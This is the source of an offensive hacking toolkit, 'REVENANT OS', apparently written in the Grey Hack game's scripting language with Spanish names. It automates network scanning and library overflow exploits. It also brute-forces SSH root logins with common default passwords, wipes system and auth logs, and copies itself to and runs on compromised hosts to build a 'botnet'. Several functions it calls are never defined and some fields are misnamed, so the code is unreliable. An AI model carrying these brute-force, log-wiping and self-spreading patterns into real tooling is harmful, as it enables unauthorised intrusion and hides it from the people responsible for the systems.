metaxploit = include_lib("/lib/metaxploit.so"); if not metaxploit then exit("Motor Nini: falta metaxploit.so")
__nini_enjambre = []
__nini_enjambre_ejecutar = function(cmd)
  for sh in __nini_enjambre
      if typeof(sh) == "shell" then
          if cmd == "limpiar" then
              syslog = sh.host_computer.File("/var/system.log")
              if syslog then syslog.set_content("")
          else
              sh.launch("/bin/" + cmd, "")
          end if
      end if
  end for
end function
__nini_buscar_vulnerabilidad = function(ip, port)
  ns = metaxploit.net_use(ip, 1*port); if not ns then return null
  lib = ns.dump_lib; mems = metaxploit.scan(lib); v_list = []
  for m in mems
    rep = metaxploit.scan_address(lib, m); pts = rep.split("<b>")
    for p in pts
      if p.indexOf("</b>") == -1 then continue
      val = p.split("</b>")[0]
      is_bad = (val.indexOf(".so") != null or val.indexOf("decompi") == 0 or val.indexOf("search") == 0 or val.indexOf("check") == 0 or val.indexOf("Unsafe") == 0 or val.indexOf(" ") != null)
      if is_bad then continue
      v_list.push({"mem": m, "pass": val})
    end for
  end for
  if v_list.len == 0 then return null
  return {"metalib": lib, "v_list": v_list, "area": v_list[0].mem, "vuln": v_list[0].pass}
end function
__nini_explotar = function(arg1, arg2=null, arg3=null)
  v_o = null; p_e = ""; lan = null
  if typeof(arg1) == "map" and arg1.hasIndex("v_list") then; v_o = arg1; p_e = arg2; lan = arg3; end if
  if typeof(arg2) == "map" and arg2.hasIndex("v_list") then; v_o = arg2; p_e = arg1; lan = arg3; end if
  if typeof(arg3) == "map" and arg3.hasIndex("v_list") then; v_o = arg3; p_e = arg1; lan = arg2; end if
  if v_o != null then
      for v in v_o["v_list"]
          res = __nini_explotar_directo(v_o["metalib"], v["mem"], v["pass"], lan); if res then return res
          if p_e != "" then; res = __nini_explotar_directo(v_o["metalib"], v["mem"], v["pass"], p_e); if res then return res; end if
      end for
  end if
  return null
end function
__nini_obtener_shell = function(obj)
  if typeof(obj) == "shell" then obj.start_terminal
  if typeof(obj) == "computer" then obj.get_shell("root","root")
end function
__nini_pedir = function(msg)
  return user_input("<color=#00e5ff>" + msg + " </color>")
end function
__nini_xor = function(a, b)
  res = 0; p = 1
  while a > 0 or b > 0
    a_bit = a % 2; b_bit = b % 2
    if a_bit != b_bit then res = res + p
    a = floor(a / 2); b = floor(b / 2); p = p * 2
  end while
  return res
end function
__nini_clean_logs = function()
  comp = get_shell.host_computer
  logs = "/var/system.log"
  log = comp.File(logs)
  if log then
    log.delete
    comp.touch("/var", "system.log")
  end if
end function
__nini_crackear_hash = function(user_or_hash, h=null)
  c = include_lib("/lib/crypto.so")
  if not c then return null
  // Soporta: crackear_hash(usuario, hash) o crackear_hash(hash)
  if h != null then return c.decipher(user_or_hash, h)
  // Si solo se pasa un argumento, asumir que es hash y usar usuario vacio
  return c.decipher("", user_or_hash)
end function
__nini_obtener_info_libreria = function(ip, p)
  m = include_lib("/lib/metaxploit.so")
  if not m then return null
  s = m.net_use(ip, p)
  if not s then return null
  l = s.dump_lib
  if not l then return null
  return {"lib_name": l.lib_name, "version": l.version, "metalib": l}
end function
__nini_explotar_directo = function(lib, a, v, lan=null)
  if lan then return lib.overflow(a, v, lan)
  return lib.overflow(a, v)
end function
__nini_descubrir_red_local = function()
  c = get_shell.host_computer
  lip = c.local_ip
  parts = lip.split("\.")
  if parts.len < 3 then return []
  net = parts[0:3].join(".") + "."
  h = []
  for i in range(1, 254)
    ip = net + i
    if ip == lip then continue
    if get_shell.ping(ip) == 1 then h.push(ip)
  end for
  return h
end function
__nini_obtener_router_objetivo = function(ip)
  r = get_router(ip)
  if r and r.public_ip == ip then return r
  return null
end function
__nini_replicar_binario = function(s, r)
  if not s or typeof(s) != "shell" then return false
  p = get_shell.host_computer.File(program_path)
  if not p then return false
  res = s.scp(p.path, r, get_shell, 1)
  if res == 1 or res == true then return true else return false
end function
__nini_buscar_vectores_escalada = function(s)
  c = s; if typeof(s) == "shell" then c = s.host_computer
  v = []
  paths = ["/lib"]
  for p in paths
    f = c.File(p)
    if f then
      items = f.get_files + f.get_folders
      for i in items
        if i.name.indexOf(".so") >= 0 then
            v.push({"path": i.path, "type": "library (.so)", "severity": "CRITICAL"})
        end if
      end for
    end if
  end for
  return v
end function
__nini_tabla = function(headers, rows)
  // Strip tags para calcular anchos visibles
  strip = function(s)
      res = ""
      in_tag = false
      if s.len == 0 then return res
      for i in range(0, s.len - 1)
          c = s[i]
          if c == "<" then
              in_tag = true
          else
              if c == ">" then
                  in_tag = false
              else
                  if not in_tag then res = res + c
              end if
          end if
      end for
      return res
  end function
  // Calcular anchos de columna
  widths = []
  for i in range(0, headers.len - 1)
      widths.push(strip(str(headers[i])).len)
  end for
  for row in rows
      for i in range(0, row.len - 1)
          if i >= widths.len then continue
          w = strip(str(row[i])).len
          if w > widths[i] then widths[i] = w
      end for
  end for
  // Funcion de padding
  pad = function(s, w)
      result = str(s)
      while strip(result).len < w
          result = result + " "
      end while
      return result
  end function
  // Imprimir header con color
  line = "<color=#00e5ff>"
  for i in range(0, headers.len - 1)
      if i > 0 then line = line + " | "
      line = line + pad(str(headers[i]), widths[i])
  end for
  print(line + "</color>")
  // Imprimir separador elegante
  sep = ""
  for i in range(0, widths.len - 1)
      if i > 0 then sep = sep + "-+-"
      for j in range(0, widths[i] - 1)
          sep = sep + "-"
      end for
  end for
  print("<color=#424242>" + sep + "</color>")
  // Imprimir filas
  for row in rows
      line = ""
      for i in range(0, widths.len - 1)
          if i > 0 then line = line + " | "
          if i < row.len then
              line = line + pad(str(row[i]), widths[i])
          else
              line = line + pad("", widths[i])
          end if
      end for
      print(line)
  end for
  return ""
end function
// --- MACROS DE CONEXION REMOTA ---
__nini_conectar_ssh = function(ip, user, pass, port=22)
  return get_shell.connect_service(ip, port, user, pass)
end function
__nini_conectar_ftp = function(ip, user, pass)
  return get_shell.connect_service(ip, 21, user, pass, "ftp")
end function
__nini_conectar_net = function(ip, port=1)
  m = include_lib("/lib/metaxploit.so")
  if not m then return null
  return m.net_use(ip, port)
end function
__nini_get_router = function(ip=null)
  return get_router(ip)
end function
__nini_ping_port = function(ip, port)
  r = get_router(ip)
  if not r then return null
  return r.ping_port(port)
end function
__nini_scan_ip = function(ip)
  r = get_router(ip)
  if not r then return null
  return r.computers_lan_ip
end function
__nini_used_ports = function(ip=null)
  r = get_router(ip)
  if not r then return null
  return r.used_ports
end function
__nini_device_ports = function(ip)
  r = get_router(ip)
  if not r then return null
  return r.device_ports(ip)
end function
__nini_port_info = function(port)
  r = get_router
  if not r then return null
  return r.port_info(port)
end function
__nini_dump_lib = function(netsession)
  if not netsession then return null
  return netsession.dump_lib
end function
__nini_scan_lib = function(metalib)
  m = include_lib("/lib/metaxploit.so")
  if not m then return null
  if not metalib then return null
  return m.scan(metalib)
end function
__nini_scan_address = function(metalib, address)
  m = include_lib("/lib/metaxploit.so")
  if not m then return null
  return m.scan_address(metalib, address)
end function
__nini_overflow = function(metalib, address, value, extra=null)
  if extra then return metalib.overflow(address, value, extra)
  return metalib.overflow(address, value)
end function
__nini_launch = function(shell, program, params="")
  if not shell or typeof(shell) != "shell" then return null
  return shell.launch(program, params)
end function
__nini_scp_upload = function(shell, filePath, remotePath)
  if not shell or typeof(shell) != "shell" then return false
  local = get_shell.host_computer.File(filePath)
  if not local then return false
  return shell.scp(filePath, remotePath, get_shell, 1)
end function
__nini_scp_download = function(shell, remotePath, localPath)
  if not shell or typeof(shell) != "shell" then return false
  return shell.scp(remotePath, localPath, get_shell, 1)
end function
// --- MACROS DE PIVOTING (desde nodo comprometido) ---
__nini_get_local_ip = function(shell)
  if not shell then return null
  comp = shell.host_computer
  if not comp then return null
  return comp.local_ip
end function
__nini_get_computer = function(shell)
  if not shell then return null
  return shell.host_computer
end function
__nini_exec_from_node = function(shell, command)
  if not shell or typeof(shell) != "shell" then return null
  // Ejecuta comando en el nodo y retorna el resultado
  return shell.launch("/bin/sh", "-c " + command)
end function
__nini_scan_from_node = function(shell)
  // Escanea la red local DESDE el nodo comprometido
  if not shell then return []
  comp = shell.host_computer
  if not comp then return []
  local_ip = comp.local_ip
  if not local_ip then return []
  partes = local_ip.split(".")
  if partes.len < 3 then return []
  net = partes[0] + "." + partes[1] + "." + partes[2] + "."
  hosts = []
  for i in range(1, 254)
    ip = net + str(i)
    if ip == local_ip then continue
    if shell.ping(ip) == 1 then hosts.push(ip)
  end for
  return hosts
end function
__nini_get_router_from_node = function(shell)
  // Obtiene el router de la red del nodo comprometido
  if not shell then return null
  comp = shell.host_computer
  if not comp then return null
  local_ip = comp.local_ip
  if not local_ip then return null
  return get_router(local_ip)
end function
__nini_lan_ips_from_node = function(shell)
  // Obtiene todas las IPs en la red del nodo (desde su router)
  if not shell then return []
  router = __nini_get_router_from_node(shell)
  if not router then return []
  return router.computers_lan_ip
end function
// --- LIMPIEZA DE HUELLAS (metodo touch) ---
__nini_limpiar_logs = function(shell=null)
  // Limpia logs borrando y recreando con touch (archivo en blanco sin rastros)
  if not shell then shell = get_shell
  comp = shell.host_computer
  if not comp then return 0
  logs = [
    "/var/system.log",
    "/var/log/syslog",
    "/var/log/auth.log",
  ]
  cont = 0
  for ruta in logs
    partes = ruta.split("/")
    nombre = partes[-1]
    carpeta = "/"
    if partes.len > 2 then carpeta = partes[0:partes.len-1].join("/")
    archivo = comp.File(ruta)
    if archivo then
      archivo.delete
      comp.touch(carpeta, nombre)
      cont = cont + 1
    end if
  end for
  return cont
end function
Buffer = {}
Buffer.items = []
Buffer.max_size = 50
    Buffer.push = function(objeto, descripcion)
    if (Buffer.items.len >= Buffer.max_size) then; Buffer.items.remove(0)
        item = {"objeto": objeto, "tipo": typeof(objeto), "descripcion": descripcion or "Sin desc", "timestamp": time, "id": Buffer.items.len}
        Buffer.items.push(item)
        return item.id
end function
    Buffer.get = function(index)
    if (index < 0 or index >= Buffer.items.len) then; return null
        return Buffer.items[index].objeto
end function
    Buffer.list = function()
    if (Buffer.items.len == 0) then
            print("<color=#00e5ff>[#] </color><color=#ffffff>" + "BUFFER vacio" + "</color>")
            return ""
end if
        columnas = ["#", "Tipo", "Descripcion"]
        filas = []
    for i in range(0, Buffer.items.len)
            item = Buffer.items[i]
            filas.push([i + 1, item.tipo, item.descripcion])
end for
        return __nini_tabla(columnas, filas)
end function
    Buffer.clear = function()
        Buffer.items = []
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "BUFFER limpiado" + "</color>")
end function
Cob = {}
    Cob.set = function(clave, valor)
        globals.custom_object[clave] = valor
        return true
end function
    Cob.get = function(clave)
    if (globals.custom_object.hasIndex(clave)) then; return globals.custom_object[clave]
        return null
end function
    Cob.del = function(clave)
    if (globals.custom_object.hasIndex(clave)) then; globals.custom_object.remove(clave)
end function
Clipboard = {}
Clipboard.alpha = null
Clipboard.beta = null
Clipboard.gamma = null
    Clipboard.set = function(espacio, valor)
    if (espacio == "a") then; Clipboard.alpha = valor
    if (espacio == "b") then; Clipboard.beta = valor
    if (espacio == "c") then; Clipboard.gamma = valor
end function
    Clipboard.get = function(espacio)
    if (espacio == "a") then; return Clipboard.alpha
    if (espacio == "b") then; return Clipboard.beta
    if (espacio == "c") then; return Clipboard.gamma
        return null
end function
Aliases = {}
Aliases.lista = {"h": "ayuda", "?": "ayuda", "ll": "lateral", "ss": "sesiones", "sc": "silentclean", "rc": "rclean", "ex": "exfil", "pe": "persistencia"}
Aliases.custom = {}
    Aliases.agregar = function(alias, comando)
        Aliases.custom[alias] = comando
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Alias: " + alias + " -> " + comando + "</color>")
end function
    Aliases.resolver = function(entrada)
    if (Aliases.custom.hasIndex(entrada)) then; return Aliases.custom[entrada]
    if (Aliases.lista.hasIndex(entrada)) then; return Aliases.lista[entrada]
        return entrada
end function
    Aliases.listar = function()
        columnas = ["Alias", "Comando", "Tipo"]
        filas = []
    for alias in Aliases.lista.indexes
    filas.push([alias, Aliases.lista[alias], "Sistema"])
    end for
    for alias in Aliases.custom.indexes
    filas.push([alias, Aliases.custom[alias], "Custom"])
    end for
        return __nini_tabla(columnas, filas)
end function
Kernel = {}
Kernel.sesion_activa = null
Kernel.ip_activa = ""
Kernel.usuario = "guest"
Kernel.home_path = "/home"
Kernel.current_path = "/home"
Kernel.modo = "REMOTO"
Kernel.prompt_completo = true
    Kernel.actualizar_info = function(sesion)
    if (sesion == null) then; return
        Kernel.sesion_activa = sesion
        Kernel.ip_activa = globals.objetivo_actual or ""
    if (typeof(sesion) == "shell") then
            Kernel.usuario = sesion.user
            Kernel.home_path = sesion.home_dir
            Kernel.current_path = sesion.current_dir
end if
end function
    Kernel.info = function()
        columnas = ["Propiedad", "Valor"]
        filas = [
        ["Sesion", Kernel.ip_activa or "Ninguna",],
        ["Usuario", Kernel.usuario,],
        ["Path", Kernel.current_path,],
        ["Modo", Kernel.modo,],
        ["Sesiones", str(enjambre.len),],
        ["Buffer", str(Buffer.items.len),],
        ]
        return __nini_tabla(columnas, filas)
end function
Config = {}
Config.archivo = "/root/.revenantrc"
Config.datos = {"color_primario": "#00e5ff", "auto_jump": true, "max_buffer": 50}
    Config.guardar = function()
        contenido = ""
    for clave in Config.datos.indexes
    contenido = contenido + clave + "=" + str(Config.datos[clave]) + char(10)
    end for
        archivo = get_shell.host_computer.File(Config.archivo)
    if (archivo) then; archivo.set_content(contenido)
end function
    Config.cargar = function()
        archivo = get_shell.host_computer.File(Config.archivo)
    if (not archivo) then; return
        contenido = archivo.get_content
    if (contenido == null or contenido == "") then; return
        lineas = contenido.split(char(10))
    for linea in lineas
        if (linea == "") then; continue
            partes = linea.split("=")
        if (partes.len >= 2) then; Config.datos[partes[0].trim] = partes[1:].join("=").trim
end for
end function
    Config.obtener = function(clave, default)
    if (Config.datos.hasIndex(clave)) then; return Config.datos[clave]
        return default
end function
    Config.establecer = function(clave, valor)
        Config.datos[clave] = valor
        Config.guardar()
end function
Log = {}
Log.historial = []
Log.maximo = 100
    Log.agregar = function(tipo, mensaje)
        Log.historial.push({"tipo": tipo, "mensaje": mensaje, "tiempo": time})
    if (Log.historial.len > Log.maximo) then; Log.historial.remove(0)
end function
    Log.ver = function(cantidad)
        cantidad = cantidad or 20
        if Log.historial.len > cantidad then
    inicio = Log.historial.len - cantidad
        else
    inicio = 0
        end if
    for i in range(inicio, Log.historial.len)
            entrada = Log.historial[i]
            print(entrada.tipo + ": " + entrada.mensaje)
end for
end function
    Kernel.inicializar = function()
        Config.cargar()
    if (not globals.hasIndex("custom_object")) then; globals.custom_object = {}
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Kernel inicializado" + "</color>")
end function
Kernel.inicializar()
Glasspool = {}
Glasspool.sesion = null
Glasspool.activo = false
    Glasspool.configurar = function(sesion)
        Glasspool.sesion = sesion
        Glasspool.activo = true
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Glasspool activo" + "</color>")
end function
    Glasspool.ejecutar = function(comando)
    if (not Glasspool.activo or Glasspool.sesion == null) then; return null
    if (typeof(Glasspool.sesion) == "shell") then; return Glasspool.sesion.launch("/bin/bash", "-c '" + comando + "'")
        return null
end function
    Glasspool.desactivar = function()
        Glasspool.sesion = null
        Glasspool.activo = false
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Glasspool desactivado" + "</color>")
end function
Shell = {}
Shell.comandos = {}
    Shell.registrar = function(nombre, funcion, help_text)
        Shell.comandos[nombre] = {"funcion": funcion, "help": help_text or "Sin descripcion"}
end function
    Shell.ejecutar = function(nombre, args)
        nombre = Aliases.resolver(nombre)
    if (Shell.comandos.hasIndex(nombre)) then
            funcion = Shell.comandos[nombre].funcion
        if (args.len == 0) then; return funcion()
        if (args.len == 1) then; return funcion(args[0])
        if (args.len == 2) then; return funcion(args[0], args[1])
        if (args.len == 3) then; return funcion(args[0], args[1], args[2])
        if (args.len == 4) then; return funcion(args[0], args[1], args[2], args[3])
            return funcion(args.join(" "))
end if
    if (nombre == "ls" or nombre == "dir") then; return Shell.cmd_ls(args)
    if (nombre == "cd") then; return Shell.cmd_cd(args)
    if (nombre == "cat") then; return Shell.cmd_cat(args)
    if (nombre == "pwd") then; return Shell.cmd_pwd()
    if (nombre == "whoami") then; return Shell.cmd_whoami()
    if (nombre == "clear" or nombre == "limpiar") then; return Shell.cmd_clear()
    if (nombre == "exit" or nombre == "break") then; return "EXIT"
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "Comando not encontrado: " + nombre + "</color>")
        return null
end function
    Shell.cmd_ls = function(args)
        if args.len > 0 then
    ruta = args[0]
        else
    ruta = "."
        end if
        comp = get_shell.host_computer
        archivo = comp.File(ruta)
    if (not archivo) then; return null
    if (archivo.is_directory) then
            archivos = archivo.get_files
            carpetas = archivo.get_folders
            resultado = ""
        for f in carpetas
    resultado = resultado + "<color=#00e5ff>" + f.name + "/</color>  "
        end for
        for f in archivos
    resultado = resultado + f.name + "  "
        end for
            return resultado
end if
        return archivo.name
end function
    Shell.cmd_cd = function(args)
    if (args.len == 0 or args[0] == "") then
            Kernel.current_path = Kernel.home_path
            return Kernel.current_path
end if
        nueva_ruta = args[0]
    if (nueva_ruta == "..") then
            partes = Kernel.current_path.split("/")
            partes.pop()
            Kernel.current_path = partes.join("/")
        if (Kernel.current_path == "") then; Kernel.current_path = "/"
            return Kernel.current_path
end if
    if (nueva_ruta[0] != "/") then; nueva_ruta = Kernel.current_path + "/" + nueva_ruta
        partes = nueva_ruta.split("/")
        limpio = []
    for p in partes
        if (p != "" and p != ".") then; limpio.push(p)
end for
        Kernel.current_path = "/" + limpio.join("/")
        return Kernel.current_path
end function
    Shell.cmd_cat = function(args)
    if (args.len == 0) then; return null
        ruta = args[0]
        comp = get_shell.host_computer
        archivo = comp.File(ruta)
    if (not archivo) then; return null
    if (archivo.is_binary) then; return "Archivo binario"
        return archivo.get_content
end function
    Shell.cmd_pwd = function()
        return Kernel.current_path
end function
    Shell.cmd_whoami = function()
        return Kernel.usuario
end function
    Shell.cmd_clear = function()
        clear_screen()
end function
Shell.registrar("ls", Shell.cmd_ls, "Listar archivos")
Shell.registrar("cd", Shell.cmd_cd, "Cambiar directorio")
Shell.registrar("cat", Shell.cmd_cat, "Ver archivo")
Shell.registrar("pwd", Shell.cmd_pwd, "Directorio actual")
Shell.registrar("whoami", Shell.cmd_whoami, "Usuario actual")
Shell.registrar("clear", Shell.cmd_clear, "Limpiar pantalla")
Colores = {"rojo": "<color=#FF0000FF><b>", "cian": "<color=#00FFFFFF><b>", "verde": "<color=#00FF00FF><b>", "gris": "<color=#71858DFF><b>", "naranja": "<color=#FF8400FF><b>", "reset": "</color></b>",}
Prompt = {}
    Prompt.generar = function()
        ip_pub = get_shell.host_computer.public_ip
        ip_local = get_shell.host_computer.local_ip
        if Kernel.usuario == "root" then
    user_color = Colores.rojo
        else
    user_color = Colores.verde
        end if
        if Glasspool.activo then
    glass = Colores.cian + "|> " + Colores.reset
        else
    glass = Colores.verde + "|> " + Colores.reset
        end if
        return user_color + Kernel.usuario + Colores.reset + "@" + ip_pub + ":" + Kernel.current_path + " " + glass
end function
    Prompt.simple = function()
    if (Kernel.usuario == "root") then; return Colores.rojo + "root$ " + Colores.reset
        return Colores.gris + "user$ " + Colores.reset
end function
Banner = {}
    Banner.mostrar = function()
        clear_screen()
        print(Colores.cian + "  REVENANT OS v3.0" + Colores.reset)
        print(Colores.gris + "  Modular | Buffer | Glasspool" + Colores.reset)
        print("")
end function
Separador = {}
    Separador.simple = function()
        print(Colores.gris + "---" + Colores.reset)
end function
    Separador.doble = function()
        print(Colores.cian + "===" + Colores.reset)
end function
    Separador.titulo = function(titulo)
        print(Colores.cian + "---[ " + titulo + " ]---" + Colores.reset)
end function
Menu = {}
    Menu.opciones = function(titulo, opciones)
        Separador.titulo(titulo)
    for i in range(0, opciones.len)
            print("  " + Colores.cian + "[" + str(i + 1) + "]" + Colores.reset + " " + opciones[i].label)
end for
        Separador.simple()
        sel = user_input(Colores.cian + "Seleccion: " + Colores.reset)
    if (sel == "") then; return null
        idx = val(sel) - 1
    if (idx < 0 or idx >= opciones.len) then; return null
    if (opciones[idx].hasIndex("cmd")) then; return opciones[idx].cmd
        return idx
end function
Progress = {}
    Progress.mostrar = function(actual, total, ancho)
        ancho = ancho or 30
        porcentaje = floor((actual / total) * 100)
        llenado = floor((actual / total) * ancho)
        barra = Colores.verde + "#" * llenado + Colores.gris + "-" * (ancho - llenado) + Colores.reset
        return "[" + barra + "] " + str(porcentaje) + "%"
end function
Status = {}
Status.activo = function(t); return Colores.verde + "+ " + Colores.reset + t; end function
Status.inactivo = function(t); return Colores.rojo + "- " + Colores.reset + t; end function
Status.info = function(t); return Colores.cian + "* " + Colores.reset + t; end function
tarea escanear_puertos(ip)
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando " + ip + "..." + "</color>")
router = get_router(ip)
if (not router) then; return null
puertos = router.used_ports
if (puertos.len == 0) then; return []
resultados = []
for port in puertos
        resultados.push({"puerto": port.port_number, "estado": port.is_closed, "servicio": router.port_info(port), "lan_ip": port.get_lan_ip})
end for
columnas = ["Puerto", "Estado", "Servicio", "LAN IP"]
filas = []
for r in resultados
        if r.estado then
    estado = "<color=#ff3131>closed</color>"
        else
    estado = "<color=#00ff41>open</color>"
        end if
        filas.push([r.puerto, estado, r.servicio, r.lan_ip])
end for
print(__nini_tabla(columnas, filas))
Buffer.push(resultados, "Scan " + ip)
return resultados
tarea escanear_red(ip_base)
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando red " + ip_base + "..." + "</color>")
if (ip_base.indexOf(".") == null) then
        mi_ip = get_shell.host_computer.local_ip
        partes = mi_ip.split(".")
        ip_base = partes[0] + "." + partes[1] + "." + partes[2] + "."
end if
encontrados = []
for i in range(1, 255)
        ip = ip_base + str(i)
        resultado = get_shell.connect_service(ip, 22, "root", "")
    if (resultado != null) then
            print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Encontrado: " + ip + "</color>")
            encontrados.push(ip)
            enjambre[ip] = resultado
end if
end for
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Encontrados: " + str(encontrados.len) + "</color>")
if (encontrados.len > 0) then; Buffer.push(encontrados, "Red " + ip_base)
return encontrados
tarea whois_objetivo(ip)
router = get_router(ip)
if (not router) then; return null
columnas = ["Propiedad", "Valor"]
puertos_abiertos = []
for port in router.used_ports
    if (not port.is_closed) then; puertos_abiertos.push(str(port.port_number))
end for
filas = [
["IP Publica", router.public_ip,],
["IP Local", router.local_ip,],
["Puertos", puertos_abiertos.join(", "),],
]
print(__nini_tabla(columnas, filas))
return router
tarea explotar_objetivo(ip, puerto)
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Explotando " + ip + ":" + str(puerto) + "</color>")
if (puerto == 0) then; return explotar_router(ip)
vuln = __nini_buscar_vulnerabilidad(ip, puerto)
if (not vuln) then; return null
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Vuln: " + vuln.lib_name + " v" + vuln.version + "</color>")
for v in vuln.v_list
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Probando: " + v.mem + "</color>")
        sesion = __nini_explotar_directo(vuln.metalib, v.mem, v.pass, "")
    if (sesion != null) then
            tipo = typeof(sesion)
        if (tipo == "shell" or tipo == "computer") then
                print("<color=#00ff41>[OK] </color><color=#ffffff>" + "ACCESO OBTENIDO!" + "</color>")
                enjambre[ip] = sesion
                Buffer.push(sesion, "Shell " + ip)
            if (Config.obtener("auto_jump", true)) then; jumping_auto(sesion, ip)
                return sesion
end if
end if
end for
print("<color=#ffea00>[!] </color><color=#ffffff>" + "Explotacion fallida" + "</color>")
return null
tarea explotar_router(ip)
router = get_router(ip)
if (not router) then; return null
for port in router.used_ports
    if (port.is_closed) then; continue
        vuln = __nini_buscar_vulnerabilidad(ip, port.port_number)
    if (vuln) then
        for v in vuln.v_list
                sesion = __nini_explotar_directo(vuln.metalib, v.mem, v.pass, "")
            if (sesion != null) then
                    print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Router comprometido!" + "</color>")
                    enjambre[ip] = sesion
                    Buffer.push(sesion, "Router " + ip)
                    return sesion
end if
end for
end if
end for
return null
tarea __nini_limpiar_logs(ip)
if (ip == "") then
        get_shell.host_computer.File("/var/system.log").set_content("")
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Logs locales limpiados" + "</color>")
else if (enjambre.hasIndex(ip)) then
            sesion = enjambre[ip]
        if (typeof(sesion) == "shell") then
                sesion.launch("/bin/bash", "-c 'echo > /var/system.log'")
                print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Logs remotos limpiados" + "</color>")
end if
end if
    jumping_auto = function(sesion, ip)
    if (typeof(sesion) != "shell") then; return null
        comp = get_shell.host_computer
        script_nombre = "revenant.gs"
    for f in comp.File(current_path).get_files
        if (f.name.indexOf("revenant") != null and f.name.indexOf(".gs") != null) then; script_nombre = f.name
end for
        script_local = comp.File(current_path + "/" + script_nombre)
    if (not script_local) then; script_local = comp.File(program_path)
    if (not script_local) then; return null
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Copiando a " + ip + "..." + "</color>")
    for dest in ["/tmp", "/home"]
            resultado = sesion.host_computer.touch(dest, script_nombre)
            archivo = sesion.host_computer.File(dest + "/" + script_nombre)
        if (archivo) then
                archivo.set_content(script_local.get_content)
                print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Copiado a: " + dest + "/" + script_nombre + "</color>")
                sesion.launch(dest + "/" + script_nombre)
                Buffer.push(sesion, "Jump " + ip)
                return archivo
end if
end for
        return null
end function
tarea jump_manual
if (enjambre.len == 0) then; return
nodos = enjambre.indexes
columnas = ["#", "IP", "Tipo"]
filas = []
for i in range(0, nodos.len)
        filas.push([i + 1, nodos[i], typeof(enjambre[nodos[i]])])
end for
print(__nini_tabla(columnas, filas))
sel = __nini_pedir("Selecciona (#): ")
if (sel == "") then; return
idx = val(sel) - 1
if (idx < 0 or idx >= nodos.len) then; return
jumping_auto(enjambre[nodos[idx]], nodos[idx])
tarea scan_and_jump
mi_ip = get_shell.host_computer.local_ip
partes = mi_ip.split(".")
red_base = partes[0] + "." + partes[1] + "." + partes[2] + "."
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando " + red_base + "0/24..." + "</color>")
encontrados = 0
for i in range(1, 255)
        ip = red_base + str(i)
    if (enjambre.hasIndex(ip)) then; continue
    for pwd in ["root", "toor", "admin", "password", "123456", ""]
            resultado = get_shell.connect_service(ip, 22, "root", pwd)
        if (resultado != null) then
                print("<color=#00ff41>[OK] </color><color=#ffffff>" + ip + "</color>")
                enjambre[ip] = resultado
                Buffer.push(resultado, "SSH " + ip)
                encontrados = encontrados + 1
end if
end for
end for
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "ScanJump: " + str(encontrados) + " targets" + "</color>")
tarea jump_listar
if (enjambre.len == 0) then; return
columnas = ["IP", "Tipo", "Usuario"]
filas = []
for ip in enjambre.indexes
        sesion = enjambre[ip]
        tipo = typeof(sesion)
        if tipo == "shell" then
    usuario = sesion.user
        else
    usuario = "-"
        end if
        filas.push([ip, tipo, usuario])
end for
print(__nini_tabla(columnas, filas))
tarea modulo_botnet_menu
if (enjambre.len == 0) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "El enjambre esta vacio. Asalta algum objetivo primero." + "</color>")
        return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "SESIONES ACTIVAS (" + str(enjambre.len) + "):" + "</color>")
nodos = enjambre.indexes
columnas = ["#", "IP", "Tipo"]
filas = []
for i in range(0, nodos.len)
        ip = nodos[i]
        sesion = enjambre[ip]
        tipo = typeof(sesion)
        filas.push([i + 1, ip, tipo])
end for
print(__nini_tabla(columnas, filas))
dibujar_separador()
sel = __nini_pedir("Selecciona sesion (#) or Enter for volver: ")
if (sel == "") then; return
idx = val(sel) - 1
if (idx < 0 or idx >= nodos.len) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "Seleccion invalida." + "</color>")
        return
end if
ip_seleccionada = nodos[idx]
sesion_seleccionada = enjambre[ip_seleccionada]
modulo_sesion_interactuar(ip_seleccionada, sesion_seleccionada)
tarea modulo_sesion_interactuar(ip, sesion)
tipo = typeof(sesion)
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "SESION: " + ip + " (" + tipo + ")" + "</color>")
opciones = []
if (tipo == "shell") then
        opciones = [
        {"label": "Abrir terminal", "cmd": "terminal"},
        {"label": "Jump (copiar and ejecutar)", "cmd": "jump"},
        {"label": "Ver archivos", "cmd": "files"},
        {"label": "Informacion del sistema", "cmd": "info"},
        {"label": "Descargar archivo", "cmd": "download"},
        {"label": "Subir archivo", "cmd": "upload"},
        {"label": "Ejecutar comando", "cmd": "exec"},
        {"label": "Scan & Jump automatico", "cmd": "scanjump"},
        ]
else if (tipo == "computer") then
            opciones = [
            {"label": "Ver archivos", "cmd": "files"},
            {"label": "Informacion del sistema", "cmd": "info"},
            {"label": "Descargar archivo", "cmd": "download"},
            {"label": "Subir archivo", "cmd": "upload"},
            {"label": "Crear usuario", "cmd": "adduser"},
            ]
else if (tipo == "file") then
                opciones = [
                {"label": "Ver contenido", "cmd": "view"},
                {"label": "Listar directorio", "cmd": "list"},
                {"label": "Descargar", "cmd": "download"},
                ]
else if (tipo == "number" or tipo == "router") then
                    opciones = [
                    {"label": "Ver puertos", "cmd": "ports"},
                    {"label": "Ver dispositivos", "cmd": "devices"},
                    {"label": "Informacion del router", "cmd": "info"},
                    ]
else
                    opciones = [
                    {"label": "Ver informacion", "cmd": "info"},
                    ]
end if
accion = menu_interactivo("ACCIONES", opciones)
if (not accion) then; return
if (accion == "terminal") then; sesion.start_terminal
else if (accion == "files") then; sesion_action_files(ip, sesion)
